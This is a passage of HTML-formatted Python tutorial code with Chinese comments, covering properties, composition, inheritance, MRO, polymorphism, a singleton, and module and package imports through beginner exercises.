class=\"line\"></span><br><span class=\"line\">    # 先定义用于取值的函数</span><br><span class=\"line\">    @property</span><br><span class=\"line\">    def age(self):</span><br><span class=\"line\">        return self.__age</span><br><span class=\"line\"></span><br><span class=\"line\">    # 再定义用于赋值的函数</span><br><span class=\"line\">    @age.setter</span><br><span class=\"line\">    def age(self, age):</span><br><span class=\"line\">        if age &gt; 0 and age &lt; 100:</span><br><span class=\"line\">            self.__age = age</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            print(&#x27;age is not in defined range&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # def setAge(self, age):</span><br><span class=\"line\">    #     if age &gt; 0 and age &lt; 100:</span><br><span class=\"line\">    #         self.__age = age</span><br><span class=\"line\">    #     else:</span><br><span class=\"line\">    #         print(&#x27;age is not in defined range&#x27;)</span><br><span class=\"line\">    #</span><br><span class=\"line\">    # def getAge(self):</span><br><span class=\"line\">    #     return self.__age</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return &#x27;name &#123;&#125;, age &#123;&#125;, score &#123;&#125;&#x27;.format(self.__name, self.__age, self.__score)</span><br><span class=\"line\"></span><br><span class=\"line\">s = Student(&#x27;peng&#x27;, 20)</span><br><span class=\"line\">print(s)</span><br><span class=\"line\"></span><br><span class=\"line\">s.name = &#x27;xiaopeng&#x27;</span><br><span class=\"line\">print(s.name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s.age = 130</span><br><span class=\"line\">print(s.age)</span><br><span class=\"line\">print(s.__dir__())</span><br><span class=\"line\"></span><br><span class=\"line\"># # 私有化赋值</span><br><span class=\"line\"># s.setAge(30)</span><br><span class=\"line\"># print(s.getAge())</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"关联关系-has-a-py\"><a href=\"#关联关系-has-a-py\" class=\"headerlink\" title=\"关联关系-has a.py\"></a>关联关系-has a.py</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 继承：is a, has a</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">知识点</span><br><span class=\"line\">1. has a</span><br><span class=\"line\">    一个类中使用了另外一种自定义的类型</span><br><span class=\"line\"></span><br><span class=\"line\">    student使用computer</span><br><span class=\"line\"></span><br><span class=\"line\">2. 类型</span><br><span class=\"line\">    系统类型</span><br><span class=\"line\">    str  int  float...</span><br><span class=\"line\">    自定义类型</span><br><span class=\"line\">        自定义的类都可以将其当成一种类型</span><br><span class=\"line\">        s = Student()</span><br><span class=\"line\">        s是Student类型的对象</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">import random</span><br><span class=\"line\"></span><br><span class=\"line\">class Road:</span><br><span class=\"line\">    def __init__(self, name, len):</span><br><span class=\"line\">        self.name = name</span><br><span class=\"line\">        self.len = len</span><br><span class=\"line\"></span><br><span class=\"line\">class Car:</span><br><span class=\"line\">    def __init__(self, brand, speed):</span><br><span class=\"line\">        self.brand = brand</span><br><span class=\"line\">        self.speed = speed</span><br><span class=\"line\"></span><br><span class=\"line\">    def get_time(self, road):  # road = r  road 与 r 指向同一地址，属于同一个对象</span><br><span class=\"line\">        ran_time = random.randint(1, 10)</span><br><span class=\"line\">        msg = &#x27;&#123;&#125; brand car already ran &#123;&#125; hours on &#123;&#125; with &#123;&#125; speed&#x27; \\</span><br><span class=\"line\">              &#x27;&#x27;.format(self.brand, ran_time, road.name, self.speed)</span><br><span class=\"line\">        print(msg)</span><br><span class=\"line\"></span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return &#x27;brand &#123;&#125;, speed &#123;&#125;&#x27;.format(self.brand, self.speed)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">r = Road(&#x27;JingZang highway&#x27;, 12000)</span><br><span class=\"line\">r.name = &#x27;Jingha highway&#x27;</span><br><span class=\"line\">audi = Car(&#x27;audi&#x27;, 120)</span><br><span class=\"line\"></span><br><span class=\"line\">print(audi)</span><br><span class=\"line\"></span><br><span class=\"line\">audi.get_time(r)</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># student, book, computer</span><br><span class=\"line\"></span><br><span class=\"line\">class Computer:</span><br><span class=\"line\">    def __init__(self, brand, type, color):</span><br><span class=\"line\">        self.brand = brand</span><br><span class=\"line\">        self.type = type</span><br><span class=\"line\">        self.color = color</span><br><span class=\"line\"></span><br><span class=\"line\">    def online(self):</span><br><span class=\"line\">        print(&#x27;Surfing online in computer&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return self.brand+&#x27;----&#x27;+self.type+&#x27;----&#x27;+self.color</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Book:</span><br><span class=\"line\">    def __init__(self, bname, author, number):</span><br><span class=\"line\">        self.bname = bname</span><br><span class=\"line\">        self.author = author</span><br><span class=\"line\">        self.number = number</span><br><span class=\"line\"></span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return self.bname+&#x27;---&#x27;+self.author+&#x27;---&#x27;+str(self.number)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Student:</span><br><span class=\"line\"></span><br><span class=\"line\">    def __init__(self, name, computer, book):</span><br><span class=\"line\">        self.name = name</span><br><span class=\"line\">        self.computer = computer</span><br><span class=\"line\">        self.books = []</span><br><span class=\"line\">        self.books.append(book)</span><br><span class=\"line\"></span><br><span class=\"line\">    def borrow_book(self, book):</span><br><span class=\"line\">        for book1 in self.books:</span><br><span class=\"line\">            if book1.bname == book.bname:</span><br><span class=\"line\">                print(&#x27;Already borrow the book&#x27;)</span><br><span class=\"line\">                break</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                # 将参数book添加到列表中</span><br><span class=\"line\">                self.books.append(book)</span><br><span class=\"line\">                print(&#x27;Borrow complete!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    def show_book(self):</span><br><span class=\"line\">        for book in self.books: # book就是一个book对象</span><br><span class=\"line\">            print(book.bname)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return self.name+&#x27;---&#x27;+str(self.computer)+&#x27;---&#x27;+str(self.books)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">computer = Computer(&#x27;mac&#x27;, &#x27;mac pro2018&#x27;, &#x27;deep grey&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">book = Book(&#x27;Time Raiders&#x27;, &#x27;Uncle Three&#x27;, 10)</span><br><span class=\"line\"></span><br><span class=\"line\">stu = Student(&#x27;songsong&#x27;, computer, book)</span><br><span class=\"line\">print(stu)</span><br><span class=\"line\"></span><br><span class=\"line\"># 查看借了哪些书</span><br><span class=\"line\">stu.show_book()</span><br><span class=\"line\"></span><br><span class=\"line\">book1 = Book(&#x27;Ghost Blows Out the Light&#x27;, &#x27;blogging site&#x27;, 8)</span><br><span class=\"line\">stu.borrow_book(book1)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-------------------------------------------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">stu.show_book()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"继承关系—is-a-py\"><a href=\"#继承关系—is-a-py\" class=\"headerlink\" title=\"继承关系—is a.py\"></a>继承关系—is a.py</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># is a   base class  父类  基类</span><br><span class=\"line\"># Exception</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">继承：</span><br><span class=\"line\">    Student, Employee, Doctor --&gt; 都属于Person类</span><br><span class=\"line\">    相同代码 --&gt; 代码冗余，可读性不高</span><br><span class=\"line\"></span><br><span class=\"line\">    将相同代码提取 --&gt; Person类</span><br><span class=\"line\">        Student, Employee, Doctor --&gt; 继承Person</span><br><span class=\"line\"></span><br><span class=\"line\">        class Student(Person):</span><br><span class=\"line\">            pass</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">特点：</span><br><span class=\"line\">    1.如果类中不定义__init__，调用父类super class的__init__</span><br><span class=\"line\">    2.如果类继承父类也需要定义自己的__init__，就需要在当前类的__init__中调用一下父类__init__</span><br><span class=\"line\">    3.如何调用父类__init__(参数)</span><br><span class=\"line\">        super().__init__(参数)</span><br><span class=\"line\">        super(类名，对象).__init__(参数)</span><br><span class=\"line\">    4.如果父类有eat()，子类也定义一个eat()方法，默认搜索的原则：先找当前类，再找父类</span><br><span class=\"line\">        s.eat()</span><br><span class=\"line\">        override: 覆写</span><br><span class=\"line\">        父类提供的方法不能满足子类的需求，就需要在子类中定义一个同名的方法，这种行为就叫做重写</span><br><span class=\"line\"></span><br><span class=\"line\">    5.子类的方法中也可以调用父类的方法：</span><br><span class=\"line\">        super().方法名(参数)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">class Person:</span><br><span class=\"line\">    def __init__(self, name, age):</span><br><span class=\"line\">        self.name = name</span><br><span class=\"line\">        self.age = age</span><br><span class=\"line\"></span><br><span class=\"line\">    def eat(self):</span><br><span class=\"line\">        print(self.name + &#x27;eating...&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    def run(self):</span><br><span class=\"line\">        print(self.name + &#x27;running...&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Student(Person):</span><br><span class=\"line\">    # def __init__(self, name):</span><br><span class=\"line\">    #     print(&#x27;--------------&gt;student的init&#x27;)</span><br><span class=\"line\">    #     # 如何调用父类__init__</span><br><span class=\"line\">    #     super().__init__(name)  # super() 表示父类对象</span><br><span class=\"line\">    def __init__(self, name, age, clazz):</span><br><span class=\"line\">        super().__init__(name, age)</span><br><span class=\"line\">        self.clazz = clazz</span><br><span class=\"line\"></span><br><span class=\"line\">    def study(self, course):</span><br><span class=\"line\">        print(&#x27;&#123;&#125; is studying &#123;&#125; course&#x27;.format(self.name, course))</span><br><span class=\"line\"></span><br><span class=\"line\">    def eat(self, food):</span><br><span class=\"line\">        super().eat()</span><br><span class=\"line\">        print(self.name + &#x27;eating...like eating &#x27;+food)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Employee(Person):</span><br><span class=\"line\">    def __init__(self, name, age, salary, manager):</span><br><span class=\"line\">        super().__init__(name, age)</span><br><span class=\"line\">        self.salary = salary</span><br><span class=\"line\">        self.manager = manager</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Doctor(Person):</span><br><span class=\"line\">    def __init__(self, name, age, patients):</span><br><span class=\"line\">        super(Doctor, self).__init__(name, age)</span><br><span class=\"line\">        self.patients = patients</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s = Student(&#x27;jack&#x27;, 18, &#x27;python1905&#x27;)</span><br><span class=\"line\">s.run()</span><br><span class=\"line\">s.study(&#x27;python basic&#x27;)</span><br><span class=\"line\">s.eat(&#x27;Manchu Han Imperial Feast&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">e = Employee(&#x27;Tom&#x27;, 23, 10000, &#x27;king&#x27;)</span><br><span class=\"line\">e.run()</span><br><span class=\"line\"></span><br><span class=\"line\">lists = [&#x27;zhangsan&#x27;, &#x27;lisi&#x27;, &#x27;wangwu&#x27;, &#x27;zhaoliu&#x27;]</span><br><span class=\"line\">d = Doctor(&#x27;lucy&#x27;, 30, lists)</span><br><span class=\"line\">d.run()</span><br><span class=\"line\"></span><br><span class=\"line\"># e = Employee(&#x27;lily&#x27;)</span><br><span class=\"line\"># e.run()</span><br><span class=\"line\"># d = Doctor(&#x27;Tom&#x27;)</span><br><span class=\"line\"># d.run()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"继承练习-工资管理系统-py\"><a href=\"#继承练习-工资管理系统-py\" class=\"headerlink\" title=\"继承练习-工资管理系统.py\"></a>继承练习-工资管理系统.py</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Person:</span><br><span class=\"line\">    def __init__(self, no, name, salary):</span><br><span class=\"line\">        self.no = no</span><br><span class=\"line\">        self.name = name</span><br><span class=\"line\">        self.salary = salary</span><br><span class=\"line\"></span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        msg = &#x27;employee number: &#123;&#125;, &#x27; \\</span><br><span class=\"line\">              &#x27;name: &#123;&#125;, salary for this month: &#123;&#125;&#x27;.format(self.no, self.name, self.salary)</span><br><span class=\"line\"></span><br><span class=\"line\">        return msg</span><br><span class=\"line\"></span><br><span class=\"line\">    def getSalary(self):</span><br><span class=\"line\">        return self.salary</span><br><span class=\"line\"></span><br><span class=\"line\">class Worker(Person):</span><br><span class=\"line\">    def __init__(self, no, name, salary, hours, per_hour):</span><br><span class=\"line\">        super().__init__(no, name, salary)</span><br><span class=\"line\">        self.hours = hours</span><br><span class=\"line\">        self.per_hour = per_hour</span><br><span class=\"line\"></span><br><span class=\"line\">    def getSalary(self):</span><br><span class=\"line\">        money = self.hours * self.per_hour</span><br><span class=\"line\">        self.salary += money</span><br><span class=\"line\">        return self.salary</span><br><span class=\"line\"></span><br><span class=\"line\">class Salesman(Person):</span><br><span class=\"line\">    def __init__(self, no, name, salary, salemoney, percent):</span><br><span class=\"line\">        super().__init__(no, name, salary)</span><br><span class=\"line\">        self.salemoney = salemoney</span><br><span class=\"line\">        self.percent = percent</span><br><span class=\"line\"></span><br><span class=\"line\">    def getSalary(self):</span><br><span class=\"line\">        money = self.salemoney * self.percent</span><br><span class=\"line\">        self.salary += money</span><br><span class=\"line\">        return self.salary</span><br><span class=\"line\"></span><br><span class=\"line\">w = Worker(&#x27;001&#x27;, &#x27;king&#x27;, 2000, 160, 50)</span><br><span class=\"line\">s = w.getSalary()</span><br><span class=\"line\">print(&#x27;salary per month:&#x27;, s)</span><br><span class=\"line\">print(w)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">saler = Salesman(&#x27;002&#x27;, &#x27;lucy&#x27;, 5000, 5000000, 0.003)</span><br><span class=\"line\">s = saler.getSalary()</span><br><span class=\"line\">print(&#x27;salary per month:&#x27;, s)</span><br><span class=\"line\">print(saler)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"多重继承与MRO-9-py\"><a href=\"#多重继承与MRO-9-py\" class=\"headerlink\" title=\"多重继承与MRO-9.py\"></a>多重继承与MRO-9.py</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># class Person:</span><br><span class=\"line\">#     def __init__(self, name):</span><br><span class=\"line\">#         self.name = name</span><br><span class=\"line\">#</span><br><span class=\"line\">#     def eat(self):</span><br><span class=\"line\">#         print(&#x27;-----------&gt;eat1&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\">#     def eat(self, food):</span><br><span class=\"line\">#         print(&#x27;-------------&gt;eat&#x27;, food)</span><br><span class=\"line\">#</span><br><span class=\"line\"># p = Person(&#x27;jack&#x27;)</span><br><span class=\"line\"># p.eat(&#x27;lion\\&#x27;s head&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">class Base:</span><br><span class=\"line\">    def test(self):</span><br><span class=\"line\"></span><br><span class=\"line\">        print(&#x27;------------&gt;Base&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">class A(Base):</span><br><span class=\"line\">    def test(self):</span><br><span class=\"line\">        print(&#x27;------------&gt;AAAAAAAAAAAAAAA&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">class B(Base):</span><br><span class=\"line\">    def test(self):</span><br><span class=\"line\">        print(&#x27;------------&gt;BBBBBBBBBBBBBBB&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class C(Base):</span><br><span class=\"line\">    def test(self):</span><br><span class=\"line\">        print(&#x27;-------------&gt;CCCCCCCCCCCCCC&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class D(A,B,C):</span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">d = D()</span><br><span class=\"line\">d.test()</span><br><span class=\"line\"></span><br><span class=\"line\">import inspect</span><br><span class=\"line\"></span><br><span class=\"line\">print(inspect.getmro(D))</span><br><span class=\"line\">print(D.__mro__)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">python允许多继承</span><br><span class=\"line\">def 子类(父类1，父类2，...):</span><br><span class=\"line\">    pass</span><br><span class=\"line\">    </span><br><span class=\"line\">如果父类中有相同名称方法，搜索顺序：</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 多继承的搜索顺序：经典类，新式类</span><br><span class=\"line\"></span><br><span class=\"line\">#</span><br><span class=\"line\"># python2 --&gt; 经典类：从左至右，深度优先</span><br><span class=\"line\"># 新式类：广度优先</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class P1(object):</span><br><span class=\"line\">    def foo(self):</span><br><span class=\"line\">        print(&#x27;p1--foo&#x27;)</span><br><span class=\"line\">    def bar(self):</span><br><span class=\"line\">        print(&#x27;p1--bar&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">class P2(object):</span><br><span class=\"line\">    def foo(self):</span><br><span class=\"line\">        print(&#x27;p2--foo&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">class C1(P1,P2):</span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\">class C2(P1, P2):</span><br><span class=\"line\">    def bar(self):</span><br><span class=\"line\">        print(&#x27;c2----bar&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">class D(C1, C2):</span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\">d = D()</span><br><span class=\"line\">print(D.__mro__)</span><br><span class=\"line\">d.foo()</span><br><span class=\"line\">d.bar()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"多态-py\"><a href=\"#多态-py\" class=\"headerlink\" title=\"多态.py\"></a>多态.py</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"># 面向对象 --&gt; 封装(私有化)，继承，多态</span><br><span class=\"line\"></span><br><span class=\"line\">class Person:</span><br><span class=\"line\"></span><br><span class=\"line\">    def __init__(self, name):</span><br><span class=\"line\">        self.name = name</span><br><span class=\"line\"></span><br><span class=\"line\">    def feed_pet(self, pet):</span><br><span class=\"line\"></span><br><span class=\"line\">        # isinstance(obj, 类) --&gt; 判断obj是不是类的对象或者判断obj是不是该类子类的对象</span><br><span class=\"line\">        if isinstance(pet, Pet): # 形参pet既可以接收cat对象，也可以接收dog对象，</span><br><span class=\"line\">            # 还可以接收tiger对象(tiger不是Pet的子类也能被接收)</span><br><span class=\"line\">            print(&#x27;&#123;&#125; likes feed pet &#123;&#125;, &#x27;</span><br><span class=\"line\">                  &#x27;nickname is &#123;&#125;&#x27;.format(self.name, pet.role, pet.nickname))</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            print(&#x27;not pet type.....&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Pet:</span><br><span class=\"line\">    role = &#x27;Pet&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    def __init__(self, nickname, age):</span><br><span class=\"line\">        self.nickname = nickname</span><br><span class=\"line\">        self.age = age</span><br><span class=\"line\"></span><br><span class=\"line\">    def show(self):</span><br><span class=\"line\">        print(&#x27;nickname: &#123;&#125;, age: &#123;&#125;&#x27;.format(self.nickname, self.age))</span><br><span class=\"line\"></span><br><span class=\"line\">class Cat(Pet):</span><br><span class=\"line\">    role = &#x27;cat&#x27;</span><br><span class=\"line\">    def catch_mouse(self):</span><br><span class=\"line\">        print(&#x27;catch mouse.....&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">class Dog(Pet):</span><br><span class=\"line\">    role = &#x27;dog&#x27;</span><br><span class=\"line\">    def watch_house(self):</span><br><span class=\"line\">        print(&#x27;watch house master....&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">class Tiger:</span><br><span class=\"line\">    def eat(self):</span><br><span class=\"line\">        print(&#x27;horrible, able to eat human...&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">cat = Cat(&#x27;huahua&#x27;, 2)</span><br><span class=\"line\">dog = Dog(&#x27;dahuang&#x27;, 4)</span><br><span class=\"line\">tiger = Tiger()</span><br><span class=\"line\"></span><br><span class=\"line\">person = Person(&#x27;dawei&#x27;)</span><br><span class=\"line\">person.feed_pet(cat)</span><br><span class=\"line\">person = Person(&#x27;xiaopeng&#x27;)</span><br><span class=\"line\">person.feed_pet(tiger)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"singleton-单例模式-py\"><a href=\"#singleton-单例模式-py\" class=\"headerlink\" title=\"singleton-单例模式.py\"></a>singleton-单例模式.py</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 单例模式：</span><br><span class=\"line\"># 开发模式：单例模式</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Singleton:</span><br><span class=\"line\">    # 私有化  单例的地址就存在于__instance</span><br><span class=\"line\">    __instance = None</span><br><span class=\"line\"></span><br><span class=\"line\">    # 重写__new__</span><br><span class=\"line\">    def __new__(cls):</span><br><span class=\"line\">        print(&#x27;----------————__new__&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">        if cls.__instance is None:</span><br><span class=\"line\">            print(&#x27;--------1&#x27;)</span><br><span class=\"line\">            cls.__instance = object.__new__(cls)</span><br><span class=\"line\">            return cls.__instance</span><br><span class=\"line\"></span><br><span class=\"line\">        else:</span><br><span class=\"line\">            print(&#x27;---------2&#x27;)</span><br><span class=\"line\">            return cls.__instance</span><br><span class=\"line\"></span><br><span class=\"line\">s = Singleton()</span><br><span class=\"line\">s1 = Singleton()</span><br><span class=\"line\">print(dir(Singleton))</span><br><span class=\"line\">print(s)</span><br><span class=\"line\">print(s1)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"calculate-py\"><a href=\"#calculate-py\" class=\"headerlink\" title=\"calculate.py\"></a>calculate.py</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">number = 100</span><br><span class=\"line\">name = &#x27;calculation&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">def add(*args):</span><br><span class=\"line\">    if len(args) &gt; 1:</span><br><span class=\"line\">        sum = 0</span><br><span class=\"line\">        for i in args:</span><br><span class=\"line\">            sum += i</span><br><span class=\"line\"></span><br><span class=\"line\">        return sum</span><br><span class=\"line\"></span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&#x27;require 2 arguments at minimum...&#x27;)</span><br><span class=\"line\">        return 0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def minus(*args):</span><br><span class=\"line\">    if len(args) &gt; 1:</span><br><span class=\"line\">        m = 0</span><br><span class=\"line\">        for i in args:</span><br><span class=\"line\">            m -= i</span><br><span class=\"line\"></span><br><span class=\"line\">        return m</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&#x27;require 2 arguments at minimum...&#x27;)</span><br><span class=\"line\">        return 0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def multiply(*args):</span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def divide(*args):</span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Calculate:</span><br><span class=\"line\">    def __init__(self, num):</span><br><span class=\"line\">        self.num = num</span><br><span class=\"line\"></span><br><span class=\"line\">    def test(self):</span><br><span class=\"line\">        print(&#x27;calculating by using Calculate...&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    @classmethod</span><br><span class=\"line\">    def test1(cls):</span><br><span class=\"line\">        print(&#x27;------------class method in Calculate&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def test():</span><br><span class=\"line\">    print(&#x27;This is test.....&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;__name__:&#x27;, __name__)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    test()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"模块的导入和使用-py\"><a href=\"#模块的导入和使用-py\" class=\"headerlink\" title=\"模块的导入和使用.py\"></a>模块的导入和使用.py</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">1.自定义模块</span><br><span class=\"line\">2.使用系统的一些模块</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">如果不希望模块中部分内容进行调用，可以用__name__</span><br><span class=\"line\">在本模块内__name__的值为：__main__</span><br><span class=\"line\">在其他模块中通过导入的方式调用时，__name__的值为：模块名</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">list1 = [4, 2, 7, 8, 9]</span><br><span class=\"line\"></span><br><span class=\"line\"># 导入模块</span><br><span class=\"line\"># import calculate</span><br><span class=\"line\">#</span><br><span class=\"line\">#</span><br><span class=\"line\"># # 使用模块中的函数  模块名.变量  模块名.函数  模块名.类</span><br><span class=\"line\"># result = calculate.add(*list1)</span><br><span class=\"line\"># print(result)</span><br><span class=\"line\">#</span><br><span class=\"line\">#</span><br><span class=\"line\"># # 使用模块变量</span><br><span class=\"line\"># print(calculate.number)</span><br><span class=\"line\">#</span><br><span class=\"line\"># # 使用模块中的类</span><br><span class=\"line\">#</span><br><span class=\"line\"># cal = calculate.Calculate(88)</span><br><span class=\"line\"># cal.test()</span><br><span class=\"line\"># cal.test1()</span><br><span class=\"line\"># calculate.Calculate.test1()</span><br><span class=\"line\"></span><br><span class=\"line\">from calculate import *</span><br><span class=\"line\"></span><br><span class=\"line\">result = add(*list1)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\">sum = result + number</span><br><span class=\"line\">print(sum)</span><br><span class=\"line\"></span><br><span class=\"line\">c = Calculate(80)</span><br><span class=\"line\">c.test()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"package-包的导入-py\"><a href=\"#package-包的导入-py\" class=\"headerlink\" title=\"package_包的导入.py\"></a>package_包的导入.py</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 包：存放py文件的文件夹</span><br><span class=\"line\"># 一个包中可以存放多个模块</span><br><span class=\"line\"># 项目 &gt; 包 &gt; 模块 &gt; 类 &gt; 函数 &gt; 变量</span><br><span class=\"line\"></span><br><span class=\"line\"># 使用包中的模块中的User类</span><br><span class=\"line\"># from user import models</span><br><span class=\"line\">#</span><br><span class=\"line\"># u = models.User(&#x27;admin&#x27;, &#x27;123456&#x27;)</span><br><span class=\"line\"># u.show()</span><br><span class=\"line\"></span><br><span class=\"line\"># from user.models import User</span><br><span class=\"line\">#</span><br><span class=\"line\"># u = User(&#x27;admin&#x27;, &#x27;123456&#x27;)</span><br><span class=\"line\"># u.show()</span><br><span class=\"line\">#</span><br><span class=\"line\"># from article.models import Article</span><br><span class=\"line\">#</span><br><span class=\"line\"># a = Article(&#x27;Personal summary&#x27;, &#x27;xiaowei&#x27;)</span><br><span class=\"line\"># a.show()</span><br><span class=\"line\"></span><br><span class=\"line\"># from user.models import *</span><br><span class=\"line\">#</span><br><span class=\"line\"># # print(version)</span><br><span class=\"line\"># u = User(&#x27;admin&#x27;, &#x27;123456&#x27;)</span><br><span class=\"line\"># u.show()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 用户发表文章</span><br><span class=\"line\"># 创建用户对象</span><br><span class=\"line\"></span><br><span class=\"line\"># 发表文章，文章对象</span><br><span class=\"line\"></span><br><span class=\"line\">from user.models import User</span><br><span class=\"line\">from article.models import Article</span><br><span class=\"line\"></span><br><span class=\"line\">user = User(&#x27;admin&#x27;, &#x27;123456&#x27;) # user就是通过导入User类创建的</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">article = Article(&#x27;Personal summery&#x27;, &#x27;xiaowei&#x27;)</span><br><span class=\"line\">user.publish_article(article)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"包的-init-文件-py\"><a 